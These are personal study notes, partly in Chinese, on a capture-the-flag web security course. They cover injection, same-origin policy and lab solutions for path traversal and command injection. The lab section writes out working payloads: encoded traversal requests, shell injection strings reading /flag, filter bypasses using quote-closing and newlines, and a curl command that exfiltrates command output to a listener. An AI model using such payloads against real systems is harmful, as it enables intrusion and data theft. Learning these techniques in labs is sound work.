# Intro to Cybersecurity.

> ​	Can you feel it? The sun is beginning to rise on your journey of cybersecurity. Armed with the fundamentals, you begin to push ever deeper into the realms of knowledge that previously eluded you. **Fear not: with perseverance, grit, and gumption, you will lay the groundwork for a towering mastery of security in your future.**

## Web Security

> ​	Web content is served up via the internet by *web servers*, and like everything else, these web servers, and the pages that they serve up, contain **vulnerabilities**! In this module, you will wrap yourself in the mysteries of the web, exploring various types of vulnerabilities that can occur. As you work through this module, keep in mind, **these aren't theoretical curiosities: these are common, critical vulnerabilities that occur *all the time* in the modern web** and can lead to massive data breaches, account takeover, and more.

### Injection

代码注入的问题.什么是代码注入,have a glance at it,bro......

#### Command

system("date")	更方便的打开一个shell.

system("TZ=UTC date")	设置一个环境变量,这是timezone

system("TZ = \`whoami` date")	强制执行whoami

system("TZ = ; whoami # date")	假装设置环境变量,执行指令

#### HTML

http_response(\<p>hello,\<script>alert(1)<\script>!<\p>)

做js注入.这里的上下文在html中,所以容易引发问题.

#### SQL

```SQL
SELECT * FROM users WHERE
	username = 'admin' AND
	password = '' OR 1=1 --'"
```

那么后面的OR 1=1会覆盖掉这个密码验证的过程.

先解析,进行参数化查询:(避免这样的注入问题)

```py
# Python示例（使用sqlite3）
cursor.execute(
    "SELECT * FROM users WHERE username = ? AND password = ?", 
    (username_input, password_input)
)
```

#### Stack

> ​	这个我们就比较熟悉了,缓冲区代码注入,返回导向编程攻击等.

注入的核心概念是上下文的环境.我们处在怎样的上下文中.

### Same-Origin Policy

两个 URL 的 **协议（Protocol）、域名（Domain）、端口（Port）** 必须完全相同，才算是同源。

**公式**：`协议://域名:端口`

**示例**：

|          URL A           |           URL B           | 是否同源 |             原因             |
| :----------------------: | :-----------------------: | :------: | :--------------------------: |
|  `https://example.com`   |   `https://example.com`   |    ✅     |     协议、域名、端口相同     |
|  `https://example.com`   |   `http://example.com`    |    ❌     |  协议不同（HTTPS vs HTTP）   |
|  `https://example.com`   | `https://sub.example.com` |    ❌     | 域名不同（主域名 vs 子域名） |
| `https://example.com:80` | `https://example.com:443` |    ❌     |    端口不同（80 vs 443）     |

为了保护安全.

Cross_Origin Web App

Server从不同的主机拿资源给Clients

URL结构:

\<scheme>://\<host>:\<port>/\<path>?\<query>#\<fragment>



也就是scheme,host和port都相同的时候,就可以认为是同源的.



Domain Name:

Top-Level Domain 最右边的顶级域名.

www.google.**co.uk**

Site:左边再加上一个就是网站,Site的概念.

www.**google.co.uk**

那么就是同一个Site,有可能来自于不同的Origin

SameSite的设置,None	Lax	Strict决定cookie会不会在不同站点之间发送.

在银行软件里很常见,防止把你导向到了伪造的网站或者cookie被截获.



Domain Cookie:

​	cookie制定了域名比如pwn.colledge,但是实际上这个cookie对于pwn.colledge和dojo.pwn.colldge都是有效的,反而是lax的.

我们会用到:

- [python -m http.server](https://docs.python.org/library/http.server.html)
- [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)

### LAB

#### Path Traversal(路径绕过)

> ​	想获取Server的一些关键信息,利用关键路径的一些漏洞.

/challenge/files/../../flag → /flag	这被Server识别,直接过滤掉..的路径,无效.

我们采用URL编码的方式进行绕过的操作:

```sh
$ curl -v http://challenge.localhost/docs/%2e%2e/%2e%2e/flag
```

能破解的Server就是在解码之前进行检查,但是在解码时候不检查路径中的..,从而导致了可以突破.

所以最好先进行解码,再检查问题.

它可能只能保护一个路径:

```sh
$ curl -v http://challenge.localhost:80/serve/fortunes/%2e%2e/%2e%2e/%2e%2e/flag
```

我们从一个子目录下面开始向上遍历,这样也可以造成路径的绕过.

#### CMDi Command Injection(命令注入)

命令注入,比如我们只是想获取用户名并且打印你好:

```py
import os
user_input = request.GET.get("word")  # 用户输入
os.system(f"echo Hello {user_input}")  # 直接拼接命令
```

但是我们输入:

word=Hackers; cat /etc/passwd→ 执行 echo Hello Hackers; cat /etc/passwd（泄露敏感文件)

也就是利用;可以跟着连续的命令.

常用的攻击符号:

| 符号  | 作用                   | 示例命令              |
| :---- | :--------------------- | :-------------------- |
| `;`   | 连续执行多条命令       | `echo A; cat /flag`   |
| \|    |                        | 管道符（传递输出）    |
| `&&`  | 前一条成功则执行后一条 | `echo A && cat /flag` |
| `$()` | 子命令替换             | `echo $(cat /flag)`   |
| `     | 反引号（同 `$()`）     | `echo ` \`cat /flag\` |



如果你不使用os.system而是subprocess,

subprocess.run(["echo", "Hello", user_input], shell=False)  # 安全? 其实也有可能有问题.

你可以探测,比如随便一些字符 + ; + whoami看有没有输出.

比如利用;来构造payloads.

```py
import requests
# 这里是用来构造URL参数查询的字典,就是params
payloads = "/challenge; cat /flag"

r = requests.get('http://challenge.localhost/event', params={"location":payloads})
print(r.text)
```

那么同样的,你还可以使用&& || | 等pipeline来进行操作:

```py
import requests
# 注意URL参数不要写错
payloads = "/challenge && cat /flag"
r = requests.get('http://challenge.localhost/task', params={"basepath":payloads})
print(r.text)
```

那如果它使用单引号'强制把你的输入变成字符串:

```python
arg = flask.request.args.get("location", "/challenge")
command = f"ls -l '{arg}'"
```

那么我们注入:

```sh
payloads = "/challenge' ; cat /flag #"
```

那么最后会执行:

```sh
ls -l '/challenge' ; cat flag #'
```

相信你能体会其中的意思了,先闭合前面一个',接着分号写新的命令,然后用#注释后面一个'就可以了.

事实上,任何地方,根据上下文,都有可能成为注入的弱点:

```py
arg = flask.request.args.get("tzone", "MST")
command = f"TZ={arg} date"
```

那么就可以:

```py
payloads = "; cat /flag #"
```

实际执行的命令就是:(很有意思)

```sh
TZ=; cat /flag #date
```

有的时候Server只是在做一些复杂的运算,并不会返回一些值,这个时候要怎么处理?

写一个自己用来收发的server(AI生成):要学习flask库.

```py
#!/usr/bin/env python3
from flask import Flask, request, jsonify  # 必须导入 request
import os
from datetime import datetime

app = Flask(__name__)

# 确保上传目录存在
os.makedirs("uploads", exist_ok=True)

@app.route("/", methods=["GET", "POST"])
def handle_request():
    """处理 GET 和 POST 请求"""
    if request.method == "GET":
        return "GooD!!!", 200
    
    elif request.method == "POST":
        try:
            # 收集所有可能的请求数据
            data = {
                "timestamp": datetime.now().isoformat(),
                "headers": dict(request.headers),
                "form_data": request.form.to_dict(),
                "json_data": request.get_json(silent=True),
                "raw_data": request.data.decode("utf-8"),
                "query_params": request.args.to_dict(),
                "files": [f.filename for f in request.files.values()]
            }

            # 打印到控制台（调试用）
            print("\n--- Received Request ---")
            for key, value in data.items():
                if value:  # 只打印非空字段
                    print(f"{key}: {value}")

            # 返回 JSON 响应
            return jsonify({"status": "success", "data": data}), 200

        except Exception as e:
            app.logger.error(f"Error processing request: {str(e)}")
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/upload", methods=["POST"])
def upload_file():
    """文件上传接口"""
    if "file" not in request.files:
        return "No file uploaded!", 400
    file = request.files["file"]
    file.save(f"./uploads/{file.filename}")
    return "File saved!", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1337, debug=True)
```

是的,你只需要写一个命令POST到你自己的服务器上就可以获取这个信息了.

```py
payloads = "/challenge/PWN; curl -X POST http://localhost:8000/leak --data \"$(cat /flag)\""
```

那么看这里,就是$(...)是替换的语法,执行括号内部的命令,然后再嵌入curl命令中,最后进行转发的操作.

如果它真的很不想让你注入:(怎么办???)

```py
arg = (
        flask.request.args.get("root", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
```

幽默的是直接用换行符就可以了 \n

```py
payloads = "/challenge \n cat /flag"
```















































































































